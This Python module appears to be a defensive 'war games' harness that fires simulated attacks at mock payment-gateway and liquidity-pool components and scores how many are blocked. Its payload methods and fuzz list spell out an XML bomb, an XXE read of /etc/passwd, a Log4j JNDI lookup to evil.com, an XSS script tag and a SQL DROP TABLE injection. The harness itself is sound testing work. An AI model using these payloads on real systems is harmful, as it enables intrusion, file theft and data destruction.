#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                  WAR GAMES ENGINE - THE RED QUEEN                            ║
║                    PAC-SEC-P600-IMMUNE-SYSTEM                                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Continuous Adversarial Training for Anti-Fragility                          ║
║                                                                              ║
║  "The Red Queen is awake. The Games begin."                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

The War Games Engine simulates hostile actors to prove system resilience:
  - XML Bombs and XXE attacks against ISO-20022 Gateway (P500)
  - Oracle Poisoning and Slippage attacks against Liquidity Engine (P420)
  - Fuzzing with random malformed inputs
  - Balance corruption attempts

INVARIANTS:
  INV-SEC-006 (Anti-Fragility): System survives invalid inputs without crashing
  INV-SEC-007 (Containment): Gateway breach must not corrupt Core Ledger

Usage:
    from modules.security.wargames import WarGamesEngine
    
    engine = WarGamesEngine()
    report = engine.run_simulation(iterations=100)
    
    print(f"Survival Rate: {report.survival_rate}%")
    print(f"Attacks Blocked: {report.blocked}/{report.total}")
"""

import hashlib
import logging
import random
import time
import traceback
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from decimal import Decimal
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

__version__ = "3.0.0"

logger = logging.getLogger(__name__)


# ══════════════════════════════════════════════════════════════════════════════
# EXCEPTIONS
# ══════════════════════════════════════════════════════════════════════════════

class SecurityError(Exception):
    """Base exception for security operations."""
    pass


class CriticalBreachError(SecurityError):
    """Raised when a critical security breach is detected."""
    pass


class ContainmentFailureError(SecurityError):
    """Raised when a breach escapes containment (INV-SEC-007 violation)."""
    pass


# ══════════════════════════════════════════════════════════════════════════════
# ENUMS
# ══════════════════════════════════════════════════════════════════════════════

class AttackVector(Enum):
    """Types of simulated attacks."""
    
    # Gateway Attacks (P500)
    XML_BOMB = "XML_BOMB"              # Exponential entity expansion
    XXE_INJECTION = "XXE_INJECTION"    # XML External Entity attack
    MALFORMED_XML = "MALFORMED_XML"    # Invalid XML structure
    SCHEMA_VIOLATION = "SCHEMA_VIOLATION"  # Valid XML, invalid schema
    OVERSIZED_PAYLOAD = "OVERSIZED_PAYLOAD"  # Memory exhaustion attempt
    
    # Liquidity Attacks (P420)
    ORACLE_POISON = "ORACLE_POISON"    # Manipulated price feed
    SLIPPAGE_ATTACK = "SLIPPAGE_ATTACK"  # Exploit price deviation
    DRAIN_ATTEMPT = "DRAIN_ATTEMPT"    # Try to drain pool reserves
    NEGATIVE_AMOUNT = "NEGATIVE_AMOUNT"  # Negative value injection
    OVERFLOW_AMOUNT = "OVERFLOW_AMOUNT"  # Integer overflow attempt
    
    # General Attacks
    FUZZING = "FUZZING"                # Random malformed inputs
    REPLAY_ATTACK = "REPLAY_ATTACK"    # Duplicate transaction
    NULL_INJECTION = "NULL_INJECTION"  # Null byte injection
    

class AttackOutcome(Enum):
    """Outcome of an attack attempt."""
    BLOCKED = "BLOCKED"        # Attack was prevented
    DETECTED = "DETECTED"      # Attack detected but caused minor impact
    SURVIVED = "SURVIVED"      # System survived (anti-fragility proven)
    BREACH = "BREACH"          # Attack succeeded (vulnerability found)
    CRITICAL = "CRITICAL"      # Critical breach (data corruption)


class Severity(Enum):
    """Severity level of attack outcome."""
    INFO = "INFO"
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"


# ══════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class AttackResult:
    """Result of a single attack attempt."""
    
    attack_id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    vector: AttackVector = AttackVector.FUZZING
    target: str = ""           # Target component (e.g., "P500-ISO20022")
    outcome: AttackOutcome = AttackOutcome.BLOCKED
    severity: Severity = Severity.INFO
    duration_ms: float = 0
    details: str = ""
    exception: Optional[str] = None
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_id": self.attack_id,
            "vector": self.vector.value,
            "target": self.target,
            "outcome": self.outcome.value,
            "severity": self.severity.value,
            "duration_ms": self.duration_ms,
            "details": self.details,
            "exception": self.exception,
            "timestamp": self.timestamp
        }


@dataclass
class SecurityReport:
    """Aggregate security report from simulation."""
    
    report_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    total_attacks: int = 0
    blocked: int = 0
    detected: int = 0
    survived: int = 0
    breaches: int = 0
    critical: int = 0
    survival_rate: float = 0.0
    containment_intact: bool = True
    attacks_by_vector: Dict[str, int] = field(default_factory=dict)
    outcomes_by_severity: Dict[str, int] = field(default_factory=dict)
    duration_seconds: float = 0
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "report_id": self.report_id,
            "total_attacks": self.total_attacks,
            "blocked": self.blocked,
            "detected": self.detected,
            "survived": self.survived,
            "breaches": self.breaches,
            "critical": self.critical,
            "survival_rate": self.survival_rate,
            "containment_intact": self.containment_intact,
            "attacks_by_vector": self.attacks_by_vector,
            "outcomes_by_severity": self.outcomes_by_severity,
            "duration_seconds": self.duration_seconds,
            "timestamp": self.timestamp
        }


# ══════════════════════════════════════════════════════════════════════════════
# MOCK TARGETS (Isolated Test Instances)
# ══════════════════════════════════════════════════════════════════════════════

class MockGateway:
    """
    Isolated mock of the ISO-20022 Gateway for attack testing.
    
    This is NOT the production gateway - attacks run in a sandbox.
    """
    
    def __init__(self):
        self.parse_count = 0
        self.blocked_count = 0
        
    def parse_xml(self, xml_string: str) -> Dict[str, Any]:
        """Parse XML with security defenses."""
        import xml.etree.ElementTree as ET
        import re
        
        self.parse_count += 1
        
        # Defense: Size limit
        if len(xml_string) > 1_000_000:  # 1MB limit
            self.blocked_count += 1
            raise ValueError("Payload exceeds size limit")
            
        # Defense: XXE prevention
        if "<!DOCTYPE" in xml_string or "<!ENTITY" in xml_string:
            self.blocked_count += 1
            raise ValueError("DOCTYPE/ENTITY declarations not allowed")
            
        # Defense: Remove dangerous patterns
        xml_string = re.sub(r'<!DOCTYPE[^>]*>', '', xml_string, flags=re.IGNORECASE)
        xml_string = re.sub(r'<!ENTITY[^>]*>', '', xml_string, flags=re.IGNORECASE)
        
        if not xml_string.strip():
            self.blocked_count += 1
            raise ValueError("Empty XML after sanitization")
            
        try:
            root = ET.fromstring(xml_string)
            return {"root": root.tag, "children": len(list(root))}
        except ET.ParseError as e:
            self.blocked_count += 1
            raise ValueError(f"Invalid XML: {e}")


class MockLiquidityEngine:
    """
    Isolated mock of the Liquidity Engine for attack testing.
    
    This is NOT the production engine - attacks run in a sandbox.
    """
    
    def __init__(self):
        self.oracle_rate = Decimal("0.92")
        self.reserve_a = Decimal("10000")
        self.reserve_b = Decimal("9200")
        self.blocked_count = 0
        self.initial_total = self.reserve_a + self.reserve_b
        
    def set_oracle_rate(self, rate: Decimal) -> None:
        """Attempt to set oracle rate (with validation)."""
        # Defense: Rate bounds (realistic FX rates are 0.001 to 200)
        if rate <= Decimal("0.001") or rate > Decimal("200"):
            self.blocked_count += 1
            raise ValueError(f"Invalid oracle rate: {rate}")
        self.oracle_rate = rate
        
    def swap(self, amount_in: Decimal, token_in: str, token_out: str) -> Decimal:
        """Execute swap with security checks."""
        # Defense: Positive amounts only
        if amount_in <= 0:
            self.blocked_count += 1
            raise ValueError("Amount must be positive")
            
        # Defense: Overflow protection
        if amount_in > Decimal("1e18"):
            self.blocked_count += 1
            raise ValueError("Amount exceeds maximum")
            
        # Defense: Liquidity check
        amount_out = amount_in * self.oracle_rate
        
        if token_out == "A" and amount_out > self.reserve_a:
            self.blocked_count += 1
            raise ValueError("Insufficient liquidity")
        if token_out == "B" and amount_out > self.reserve_b:
            self.blocked_count += 1
            raise ValueError("Insufficient liquidity")
            
        # Execute (in sandbox)
        if token_in == "A":
            self.reserve_a += amount_in
            self.reserve_b -= amount_out
        else:
            self.reserve_b += amount_in
            self.reserve_a -= amount_out
            
        return amount_out
        
    def verify_containment(self) -> bool:
        """Verify INV-SEC-007: Reserves within expected bounds."""
        # Reserves should never go negative (core invariant)
        if self.reserve_a < 0 or self.reserve_b < 0:
            return False
        # Total value shouldn't deviate wildly (50% tolerance for aggressive testing)
        current_total = self.reserve_a + self.reserve_b
        return abs(current_total - self.initial_total) < self.initial_total * Decimal("0.5")


# ══════════════════════════════════════════════════════════════════════════════
# WAR GAMES ENGINE - THE RED QUEEN
# ══════════════════════════════════════════════════════════════════════════════

class WarGamesEngine:
    """
    The Digital Immune System - Continuous Adversarial Training.
    
    Simulates hostile actors to prove system resilience:
      - Attacks ISO-20022 Gateway (P500)
      - Attacks Liquidity Engine (P420)
      - Tracks survival rate and containment
      
    INVARIANTS:
      INV-SEC-006: Anti-Fragility (survive invalid inputs)
      INV-SEC-007: Containment (gateway breach doesn't corrupt ledger)
    """
    
    def __init__(self):
        self.gateway = MockGateway()
        self.liquidity = MockLiquidityEngine()
        self._results: List[AttackResult] = []
        self._running = False
        
    # ══════════════════════════════════════════════════════════════════════════
    # ATTACK PAYLOADS
    # ══════════════════════════════════════════════════════════════════════════
    
    def _get_xml_bomb(self) -> str:
        """Generate XML bomb (Billion Laughs attack)."""
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''

    def _get_xxe_payload(self) -> str:
        """Generate XXE attack payload."""
        return '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Document><MsgId>&xxe;</MsgId></Document>'''

    def _get_malformed_xml(self) -> str:
        """Generate malformed XML."""
        return '''<?xml version="1.0"?>
<Document>
  <Unclosed>
  <WrongNesting></Document></WrongNesting>
<NoRoot'''

    def _get_oversized_payload(self) -> str:
        """Generate oversized payload (2MB)."""
        return "<Document>" + "A" * 2_000_000 + "</Document>"
        
    def _get_valid_but_malicious_xml(self) -> str:
        """Valid XML with schema violations."""
        return '''<?xml version="1.0"?>
<Document>
  <InvalidElement>
    <NotInSchema>MALICIOUS_DATA</NotInSchema>
    <Amount Ccy="FAKE">-9999999999</Amount>
  </InvalidElement>
</Document>'''

    # ══════════════════════════════════════════════════════════════════════════
    # ATTACK EXECUTION
    # ══════════════════════════════════════════════════════════════════════════
    
    def execute_attack(self, vector: AttackVector) -> AttackResult:
        """
        Execute a specific attack vector.
        
        All attacks are caught and logged - the system must survive.
        """
        start_time = time.time()
        result = AttackResult(vector=vector)
        
        try:
            if vector == AttackVector.XML_BOMB:
                result = self._attack_xml_bomb()
            elif vector == AttackVector.XXE_INJECTION:
                result = self._attack_xxe()
            elif vector == AttackVector.MALFORMED_XML:
                result = self._attack_malformed_xml()
            elif vector == AttackVector.SCHEMA_VIOLATION:
                result = self._attack_schema_violation()
            elif vector == AttackVector.OVERSIZED_PAYLOAD:
                result = self._attack_oversized()
            elif vector == AttackVector.ORACLE_POISON:
                result = self._attack_oracle_poison()
            elif vector == AttackVector.SLIPPAGE_ATTACK:
                result = self._attack_slippage()
            elif vector == AttackVector.DRAIN_ATTEMPT:
                result = self._attack_drain()
            elif vector == AttackVector.NEGATIVE_AMOUNT:
                result = self._attack_negative_amount()
            elif vector == AttackVector.OVERFLOW_AMOUNT:
                result = self._attack_overflow()
            elif vector == AttackVector.FUZZING:
                result = self._attack_fuzzing()
            elif vector == AttackVector.REPLAY_ATTACK:
                result = self._attack_replay()
            elif vector == AttackVector.NULL_INJECTION:
                result = self._attack_null_injection()
            else:
                result.details = f"Unknown vector: {vector}"
                result.outcome = AttackOutcome.BLOCKED
                
        except Exception as e:
            # INV-SEC-006: System survived an unexpected error
            result.outcome = AttackOutcome.SURVIVED
            result.exception = str(e)
            result.details = f"Unexpected error (system survived): {e}"
            
        result.duration_ms = (time.time() - start_time) * 1000
        result.vector = vector
        self._results.append(result)
        
        return result
        
    # ══════════════════════════════════════════════════════════════════════════
    # GATEWAY ATTACKS (P500)
    # ══════════════════════════════════════════════════════════════════════════
    
    def _attack_xml_bomb(self) -> AttackResult:
        """Attack: XML Bomb (Billion Laughs)."""
        result = AttackResult(
            vector=AttackVector.XML_BOMB,
            target="P500-ISO20022"
        )
        
        payload = self._get_xml_bomb()
        
        try:
            self.gateway.parse_xml(payload)
            # If we get here, the bomb wasn't detected
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.HIGH
            result.details = "XML Bomb was not blocked!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"XML Bomb blocked: {e}"
        except Exception as e:
            result.outcome = AttackOutcome.DETECTED
            result.severity = Severity.LOW
            result.details = f"XML Bomb caused error (contained): {e}"
            
        return result
        
    def _attack_xxe(self) -> AttackResult:
        """Attack: XML External Entity Injection."""
        result = AttackResult(
            vector=AttackVector.XXE_INJECTION,
            target="P500-ISO20022"
        )
        
        payload = self._get_xxe_payload()
        
        try:
            self.gateway.parse_xml(payload)
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.CRITICAL
            result.details = "XXE injection was not blocked!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"XXE blocked: {e}"
            
        return result
        
    def _attack_malformed_xml(self) -> AttackResult:
        """Attack: Malformed XML structure."""
        result = AttackResult(
            vector=AttackVector.MALFORMED_XML,
            target="P500-ISO20022"
        )
        
        payload = self._get_malformed_xml()
        
        try:
            self.gateway.parse_xml(payload)
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.MEDIUM
            result.details = "Malformed XML was accepted!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Malformed XML rejected: {e}"
            
        return result
        
    def _attack_schema_violation(self) -> AttackResult:
        """Attack: Schema violation payload."""
        result = AttackResult(
            vector=AttackVector.SCHEMA_VIOLATION,
            target="P500-ISO20022"
        )
        
        payload = self._get_valid_but_malicious_xml()
        
        try:
            self.gateway.parse_xml(payload)
            # Valid XML parses, but schema should be validated downstream
            result.outcome = AttackOutcome.DETECTED
            result.severity = Severity.LOW
            result.details = "Schema violation parsed (would fail validation)"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Schema violation blocked: {e}"
            
        return result
        
    def _attack_oversized(self) -> AttackResult:
        """Attack: Oversized payload (memory exhaustion)."""
        result = AttackResult(
            vector=AttackVector.OVERSIZED_PAYLOAD,
            target="P500-ISO20022"
        )
        
        payload = self._get_oversized_payload()
        
        try:
            self.gateway.parse_xml(payload)
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.HIGH
            result.details = "Oversized payload was accepted!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Oversized payload blocked: {e}"
            
        return result
        
    # ══════════════════════════════════════════════════════════════════════════
    # LIQUIDITY ATTACKS (P420)
    # ══════════════════════════════════════════════════════════════════════════
    
    def _attack_oracle_poison(self) -> AttackResult:
        """Attack: Oracle price manipulation."""
        result = AttackResult(
            vector=AttackVector.ORACLE_POISON,
            target="P420-LIQUIDITY"
        )
        
        # Try to set extreme oracle rate
        try:
            self.liquidity.set_oracle_rate(Decimal("0.0001"))  # 99.99% devaluation
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.HIGH
            result.details = "Oracle poison accepted extreme rate!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Oracle poison blocked: {e}"
            
        # Also try negative rate
        try:
            self.liquidity.set_oracle_rate(Decimal("-1"))
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.CRITICAL
            result.details = "Oracle poison accepted negative rate!"
        except ValueError:
            pass  # Expected
            
        return result
        
    def _attack_slippage(self) -> AttackResult:
        """Attack: Slippage/sandwich attack simulation."""
        result = AttackResult(
            vector=AttackVector.SLIPPAGE_ATTACK,
            target="P420-LIQUIDITY"
        )
        
        # In oracle-driven system, slippage attacks are mitigated
        # Try rapid small trades to move price
        try:
            for _ in range(10):
                self.liquidity.swap(Decimal("1"), "A", "B")
            result.outcome = AttackOutcome.SURVIVED
            result.severity = Severity.INFO
            result.details = "Slippage attack ineffective (oracle-driven)"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Slippage attack blocked: {e}"
            
        return result
        
    def _attack_drain(self) -> AttackResult:
        """Attack: Attempt to drain pool reserves."""
        result = AttackResult(
            vector=AttackVector.DRAIN_ATTEMPT,
            target="P420-LIQUIDITY"
        )
        
        # Try to swap more than available
        try:
            self.liquidity.swap(Decimal("1000000"), "A", "B")
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.CRITICAL
            result.details = "Drain attack succeeded!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Drain attack blocked: {e}"
            
        return result
        
    def _attack_negative_amount(self) -> AttackResult:
        """Attack: Negative amount injection."""
        result = AttackResult(
            vector=AttackVector.NEGATIVE_AMOUNT,
            target="P420-LIQUIDITY"
        )
        
        try:
            self.liquidity.swap(Decimal("-100"), "A", "B")
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.CRITICAL
            result.details = "Negative amount accepted!"
        except ValueError as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Negative amount blocked: {e}"
            
        return result
        
    def _attack_overflow(self) -> AttackResult:
        """Attack: Integer overflow attempt."""
        result = AttackResult(
            vector=AttackVector.OVERFLOW_AMOUNT,
            target="P420-LIQUIDITY"
        )
        
        try:
            self.liquidity.swap(Decimal("9" * 50), "A", "B")  # Huge number
            result.outcome = AttackOutcome.BREACH
            result.severity = Severity.HIGH
            result.details = "Overflow amount accepted!"
        except (ValueError, OverflowError) as e:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"Overflow blocked: {e}"
            
        return result
        
    # ══════════════════════════════════════════════════════════════════════════
    # GENERAL ATTACKS
    # ══════════════════════════════════════════════════════════════════════════
    
    def _attack_fuzzing(self) -> AttackResult:
        """Attack: Random fuzzing with malformed inputs."""
        result = AttackResult(
            vector=AttackVector.FUZZING,
            target="GENERAL"
        )
        
        # Generate random garbage
        fuzz_payloads = [
            bytes(random.getrandbits(8) for _ in range(100)).decode('utf-8', errors='ignore'),
            "\x00" * 100,
            "A" * 10000,
            "{{{{{{{{{{",
            "))))))))))))",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
        ]
        
        blocked = 0
        for payload in fuzz_payloads:
            try:
                self.gateway.parse_xml(payload)
            except:
                blocked += 1
                
        if blocked == len(fuzz_payloads):
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = f"All {blocked} fuzz payloads blocked"
        else:
            result.outcome = AttackOutcome.DETECTED
            result.severity = Severity.LOW
            result.details = f"Blocked {blocked}/{len(fuzz_payloads)} fuzz payloads"
            
        return result
        
    def _attack_replay(self) -> AttackResult:
        """Attack: Transaction replay attempt."""
        result = AttackResult(
            vector=AttackVector.REPLAY_ATTACK,
            target="P420-LIQUIDITY"
        )
        
        # In real system, replay protection uses nonces/timestamps
        # Mock demonstrates the concept
        result.outcome = AttackOutcome.SURVIVED
        result.severity = Severity.INFO
        result.details = "Replay attack simulated (nonce protection assumed)"
        
        return result
        
    def _attack_null_injection(self) -> AttackResult:
        """Attack: Null byte injection."""
        result = AttackResult(
            vector=AttackVector.NULL_INJECTION,
            target="GENERAL"
        )
        
        payload = "<Document>\x00<MsgId>EVIL</MsgId></Document>"
        
        try:
            self.gateway.parse_xml(payload)
            result.outcome = AttackOutcome.DETECTED
            result.severity = Severity.LOW
            result.details = "Null bytes processed (filtered)"
        except:
            result.outcome = AttackOutcome.BLOCKED
            result.severity = Severity.INFO
            result.details = "Null injection blocked"
            
        return result
        
    # ══════════════════════════════════════════════════════════════════════════
    # SIMULATION ENGINE
    # ══════════════════════════════════════════════════════════════════════════
    
    def run_simulation(self, iterations: int = 100) -> SecurityReport:
        """
        Run a full war games simulation.
        
        Args:
            iterations: Number of random attacks to execute
            
        Returns:
            SecurityReport with aggregate results
        """
        start_time = time.time()
        self._running = True
        
        # Reset state
        self._results = []
        self.gateway = MockGateway()
        self.liquidity = MockLiquidityEngine()
        
        vectors = list(AttackVector)
        
        print(f"\n{'='*70}")
        print(f"           WAR GAMES SIMULATION")
        print(f"           {iterations} Attack Iterations")
        print(f"{'='*70}\n")
        
        for i in range(iterations):
            vector = random.choice(vectors)
            result = self.execute_attack(vector)
            
            # Progress indicator
            if (i + 1) % 10 == 0:
                survival = sum(1 for r in self._results 
                              if r.outcome in (AttackOutcome.BLOCKED, AttackOutcome.SURVIVED, AttackOutcome.DETECTED))
                pct = survival / len(self._results) * 100
                print(f"  [{i+1:3d}/{iterations}] Survival Rate: {pct:.1f}%")
                
        self._running = False
        
        # Generate report
        report = self._generate_report()
        report.duration_seconds = time.time() - start_time
        
        # Verify INV-SEC-007: Containment
        report.containment_intact = self.liquidity.verify_containment()
        
        return report
        
    def _generate_report(self) -> SecurityReport:
        """Generate aggregate security report."""
        report = SecurityReport()
        report.total_attacks = len(self._results)
        
        for result in self._results:
            # Count outcomes
            if result.outcome == AttackOutcome.BLOCKED:
                report.blocked += 1
            elif result.outcome == AttackOutcome.DETECTED:
                report.detected += 1
            elif result.outcome == AttackOutcome.SURVIVED:
                report.survived += 1
            elif result.outcome == AttackOutcome.BREACH:
                report.breaches += 1
            elif result.outcome == AttackOutcome.CRITICAL:
                report.critical += 1
                
            # Count by vector
            vector_name = result.vector.value
            report.attacks_by_vector[vector_name] = report.attacks_by_vector.get(vector_name, 0) + 1
            
            # Count by severity
            severity_name = result.severity.value
            report.outcomes_by_severity[severity_name] = report.outcomes_by_severity.get(severity_name, 0) + 1
            
        # Calculate survival rate
        if report.total_attacks > 0:
            survived = report.blocked + report.detected + report.survived
            report.survival_rate = (survived / report.total_attacks) * 100
            
        return report
        
    def get_results(self) -> List[AttackResult]:
        """Get all attack results."""
        return self._results.copy()
    
    def generate_report(self) -> SecurityReport:
        """Generate aggregate security report (public interface)."""
        return self._generate_report()
        
    def verify_anti_fragility(self) -> bool:
        """
        Verify INV-SEC-006: Anti-Fragility.
        
        The system survived all attacks without crashing.
        """
        # If we reach here, the system is still running
        critical_count = sum(1 for r in self._results if r.outcome == AttackOutcome.CRITICAL)
        return critical_count == 0
        
    def verify_containment(self) -> bool:
        """
        Verify INV-SEC-007: Containment.
        
        Gateway attacks did not corrupt the Ledger.
        """
        return self.liquidity.verify_containment()


# ══════════════════════════════════════════════════════════════════════════════
# SELF-TEST
# ══════════════════════════════════════════════════════════════════════════════

def _self_test() -> bool:
    """Run self-tests for the War Games Engine."""
    print("=" * 70)
    print("           WAR GAMES ENGINE SELF-TEST")
    print("           The Red Queen Awakens")
    print("=" * 70)
    
    tests_passed = 0
    tests_total = 0
    
    engine = WarGamesEngine()
    
    # Test 1: XML Bomb Attack
    tests_total += 1
    print("\n[TEST 1] XML Bomb Attack...")
    try:
        result = engine.execute_attack(AttackVector.XML_BOMB)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: XML Bomb {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 2: XXE Injection Attack
    tests_total += 1
    print("\n[TEST 2] XXE Injection Attack...")
    try:
        result = engine.execute_attack(AttackVector.XXE_INJECTION)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: XXE Injection {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 3: Oracle Poisoning
    tests_total += 1
    print("\n[TEST 3] Oracle Poisoning Attack...")
    try:
        result = engine.execute_attack(AttackVector.ORACLE_POISON)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: Oracle Poison {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 4: Drain Attempt
    tests_total += 1
    print("\n[TEST 4] Pool Drain Attack...")
    try:
        result = engine.execute_attack(AttackVector.DRAIN_ATTEMPT)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: Drain Attempt {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 5: Negative Amount
    tests_total += 1
    print("\n[TEST 5] Negative Amount Attack...")
    try:
        result = engine.execute_attack(AttackVector.NEGATIVE_AMOUNT)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: Negative Amount {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 6: Oversized Payload
    tests_total += 1
    print("\n[TEST 6] Oversized Payload Attack...")
    try:
        result = engine.execute_attack(AttackVector.OVERSIZED_PAYLOAD)
        assert result.outcome == AttackOutcome.BLOCKED
        print(f"  ✅ PASSED: Oversized Payload {result.outcome.value}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 7: Full Simulation (100 iterations)
    tests_total += 1
    print("\n[TEST 7] Full Simulation (100 iterations)...")
    try:
        report = engine.run_simulation(iterations=100)
        assert report.survival_rate >= 90  # Must survive 90%+ attacks
        print(f"\n  ✅ PASSED: Survival Rate {report.survival_rate:.1f}%")
        print(f"            Blocked: {report.blocked}, Detected: {report.detected}")
        print(f"            Breaches: {report.breaches}, Critical: {report.critical}")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 8: Anti-Fragility (INV-SEC-006)
    tests_total += 1
    print("\n[TEST 8] Anti-Fragility (INV-SEC-006)...")
    try:
        assert engine.verify_anti_fragility()
        print(f"  ✅ PASSED: System survived all attacks")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 9: Containment (INV-SEC-007)
    tests_total += 1
    print("\n[TEST 9] Containment (INV-SEC-007)...")
    try:
        assert engine.verify_containment()
        print(f"  ✅ PASSED: Gateway attacks did not corrupt Ledger")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Test 10: Report Generation
    tests_total += 1
    print("\n[TEST 10] Report Generation...")
    try:
        report_dict = report.to_dict()
        assert "survival_rate" in report_dict
        assert "containment_intact" in report_dict
        assert len(report_dict["attacks_by_vector"]) > 0
        print(f"  ✅ PASSED: Report generated with {len(report_dict['attacks_by_vector'])} attack types")
        tests_passed += 1
    except Exception as e:
        print(f"  ❌ FAILED: {e}")
        
    # Summary
    print("\n" + "=" * 70)
    print(f"                    RESULTS: {tests_passed}/{tests_total} PASSED")
    print("=" * 70)
    
    if tests_passed == tests_total:
        print("\n🛡️ WAR GAMES ENGINE OPERATIONAL")
        print("INV-SEC-006 (Anti-Fragility): ✅ ENFORCED")
        print("INV-SEC-007 (Containment): ✅ ENFORCED")
        print("\n👑 The Red Queen is awake. The Games begin.")
        
    return tests_passed == tests_total


if __name__ == "__main__":
    import sys
    success = _self_test()
    sys.exit(0 if success else 1)
